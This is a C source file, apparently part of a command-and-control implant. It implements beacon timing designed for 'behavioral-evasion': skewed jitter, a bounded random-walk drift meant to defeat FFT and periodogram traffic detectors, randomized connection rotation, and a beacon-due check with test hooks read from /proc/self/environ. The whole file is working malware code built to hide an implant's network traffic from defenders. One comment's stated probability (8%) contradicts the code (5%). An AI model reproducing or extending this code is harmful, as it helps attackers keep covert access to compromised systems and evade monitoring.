/// timing.c — randomized sleep / drift / connection-rotation helpers.
/// Pure integer fixed-point math, zero libc (getrandom + nanosleep +
/// clock_gettime via direct syscalls only).
///
/// Design notes (behavioral-evasion):
///  - Uniform jitter is itself a statistical tell ("box-car" distribution);
///    the jitter here is right-skewed (log-normal-like) with a rare long
///    tail, approximating real-world connection pacing.
///  - The drift term is a bounded random walk that slowly shifts the base
///    interval over the process lifetime, defeating long-window FFT /
///    periodogram detectors.
///  - Rotation intervals randomize how long a single connection lives,
///    so the traffic shows sparse, irregular connection churn instead of
///    one eternal idle channel.
///
/// Test-only env knobs (scanned from /proc/self/environ — zero libc has no
/// getenv; these are inert in production):
///  - AX_ROTATE_MS=<ms>   override the rotation interval, bypassing the
///                        15-45 min clamp (Phase 4 gaps 2 and 8).
///  - AX_TEST_LOG=<path>  append "<monotonic_ms> <event>\n" lines for
///                        connect/rotate/reconnect (Phase 4 gap 5 FFT feed).

#include "timing.h"
#include "crt.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

#define CLOCK_MONOTONIC_ID 1

// Fixed-point scale: 1.0 = 65536
#define FP_ONE 65536U

/// Uniform random uint32 in [0, max). Rejection-free 64-bit multiply.
uint32_t ax_rand_below(uint32_t max) {
    if (max == 0) return 0;
    uint8_t rnd[4];
    ax_random_bytes(rnd, 4);
    uint32_t r = ((uint32_t)rnd[0] << 24) | ((uint32_t)rnd[1] << 16) |
                 ((uint32_t)rnd[2] << 8)  |  rnd[3];
    return (uint32_t)(((uint64_t)r * (uint64_t)max) >> 32);
}

uint64_t ax_monotonic_ms(void) {
    struct linux_timespec ts;
    if (sys_clock_gettime(CLOCK_MONOTONIC_ID, &ts) != 0) return 0;
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)(ts.tv_nsec / 1000000L);
}

/// Right-skewed multiplier around 1.0, fixed point 16.16.
///   1 + 0.28*(u1 - u2)          -> symmetric triangular body [0.72, 1.28]
///   + rare tail: with p=8%, *= (1 + 0.85*u3)  -> up to ~2.1x
static uint32_t skewed_factor(void) {
    uint32_t u1 = ax_rand_below(FP_ONE);
    uint32_t u2 = ax_rand_below(FP_ONE);
    // (u1 - u2) in signed fixed point: body = FP_ONE + 0.28*(u1-u2)
    // 0.28 * 65536 = 18350
    int64_t body = (int64_t)FP_ONE + ((int64_t)u1 - (int64_t)u2) * 18350LL / (int64_t)FP_ONE;
    uint32_t factor = (uint32_t)body;

    // Rare long tail: p = 8% (u3 < 8192/65536 would be 12.5%; use 5% via <3277)
    uint32_t u3 = ax_rand_below(FP_ONE);
    if (u3 < 3277) { // 5%
        uint32_t u4 = ax_rand_below(FP_ONE);
        // factor *= (1 + 0.85*u4)
        uint32_t mult = FP_ONE + (uint32_t)(((uint64_t)u4 * 55706ULL) >> 16); // 0.85*65536=55706
        factor = (uint32_t)(((uint64_t)factor * mult) >> 16);
    }
    return factor;
}

uint32_t ax_jitter_ms(uint32_t base_ms) {
    if (base_ms == 0) return 0;
    uint32_t factor = skewed_factor();
    uint64_t v = (uint64_t)base_ms * factor >> 16;
    // Hard floor: half the base (never let a "jittered" sleep collapse to ~0)
    uint64_t floor_v = (uint64_t)base_ms / 2;
    if (v < floor_v) v = floor_v;
    if (v > 0xFFFFFFFFULL) v = 0xFFFFFFFFULL;
    return (uint32_t)v;
}

/// Bounded random-walk drift, persistent across the process lifetime.
/// Step: ±0.4% of the base per call; band: ±25% of the base.
/// Returns the drift-adjusted base in ms (caller applies jitter on top).
static uint32_t drift_adjust(uint32_t base_ms) {
    static int32_t drift_permille = 0; // -250 .. +250
    uint32_t step = base_ms / 250 + 1; // 0.4%
    uint32_t r = ax_rand_below(step * 2 + 1);
    drift_permille += (int32_t)r - (int32_t)step;
    if (drift_permille > 250) drift_permille = 250;
    if (drift_permille < -250) drift_permille = -250;
    uint64_t adjusted = (uint64_t)base_ms * (1000 + (int64_t)drift_permille) / 1000;
    return (uint32_t)adjusted;
}

void ax_drifted_sleep_ms(uint32_t base_ms) {
    uint32_t adjusted = drift_adjust(base_ms);
    uint32_t ms = ax_jitter_ms(adjusted);
    if (ms == 0) return;
    // Granularity: sleep in <=100ms slices so shutdown/rotation stays responsive.
    while (ms > 100) {
        sys_usleep(100 * 1000);
        ms -= 100;
    }
    sys_usleep(ms * 1000);
}

/// ---- Test-only env knobs (Phase 4 gaps 2/5/8) ----

/// Look up NAME=VALUE in /proc/self/environ ("K=V\0" pairs).
/// Returns 1 and fills out[] when found, 0 otherwise.
static int ax_env_get(const char *name, char *out, int out_cap) {
    char buf[4096];
    int fd = sys_open("/proc/self/environ", 0 /* O_RDONLY */, 0);
    if (fd < 0) return 0;
    int total = 0;
    int n;
    while (total < (int)sizeof(buf) - 1 &&
           (n = (int)sys_read(fd, buf + total, sizeof(buf) - 1 - (size_t)total)) > 0)
        total += n;
    sys_close(fd);
    buf[total] = '\0';

    int name_len = 0;
    while (name[name_len]) name_len++;
    for (int i = 0; i < total; ) {
        int j = i;
        while (buf[j] && buf[j] != '=') j++;
        if (j - i == name_len && ax_memcmp(buf + i, name, (size_t)name_len) == 0) {
            int k = j + 1, o = 0;
            while (buf[k] && o < out_cap - 1) out[o++] = buf[k++];
            out[o] = '\0';
            return 1;
        }
        while (buf[i]) i++;
        i++;
    }
    return 0;
}

static uint32_t ax_env_get_u32(const char *name) {
    char v[32];
    if (!ax_env_get(name, v, sizeof(v))) return 0;
    uint32_t r = 0;
    for (int i = 0; v[i] >= '0' && v[i] <= '9'; i++)
        r = r * 10 + (uint32_t)(v[i] - '0');
    return r;
}

/// Append "<monotonic_ms> <event>\n" to the AX_TEST_LOG file (no-op if unset).
void ax_test_log(const char *event) {
    char path[256];
    if (!ax_env_get("AX_TEST_LOG", path, sizeof(path))) return;
    // O_WRONLY | O_APPEND | O_CREAT == 0x441
    int fd = sys_open(path, 0x441, 0644);
    if (fd < 0) return;

    char line[96];
    int o = 0;
    uint64_t t = ax_monotonic_ms();
    char num[24];
    int nd = 0;
    do { num[nd++] = (char)('0' + (int)(t % 10)); t /= 10; } while (t && nd < 23);
    while (nd > 0) line[o++] = num[--nd];
    line[o++] = ' ';
    int i = 0;
    while (event[i] && o < (int)sizeof(line) - 2) line[o++] = event[i++];
    line[o++] = '\n';
    sys_write(fd, line, (size_t)o);
    sys_close(fd);
}

uint64_t ax_rotation_interval_ms(uint32_t conn_timeout_ms) {
    // Test knob: AX_ROTATE_MS overrides the interval and bypasses the
    // 15-45 min clamp (Phase 4 gap 2: ~5s rotations; gap 8: 20 rotations
    // for VmRSS sampling). Inert in production.
    uint32_t override_ms = ax_env_get_u32("AX_ROTATE_MS");
    if (override_ms > 0)
        return (uint64_t)override_ms;

    uint32_t base = conn_timeout_ms;
    if (base < 1000) base = 1000;
    // 8x + skewed(0..8x) => roughly 12x .. 25x, right-skewed
    uint64_t rot = (uint64_t)base * 8 + (uint64_t)ax_jitter_ms(base * 8);
    if (rot < 900000ULL) rot = 900000ULL;      // min 15 minutes
    if (rot > 2700000ULL) rot = 2700000ULL;    // max 45 minutes
    return rot;
}

int ax_beacon_due(uint64_t now_ms, uint64_t *last_beacon_ms) {
    if (!last_beacon_ms) return 0;
    // Interval: drift-adjusted ~30 s base, then jittered (20..45 s).
    // The interval is re-derived on every call so the cadence wanders.
    uint32_t interval = ax_jitter_ms(drift_adjust(30000));
    if (*last_beacon_ms == 0 || now_ms - *last_beacon_ms >= (uint64_t)interval) {
        *last_beacon_ms = now_ms;
        return 1;
    }
    return 0;
}
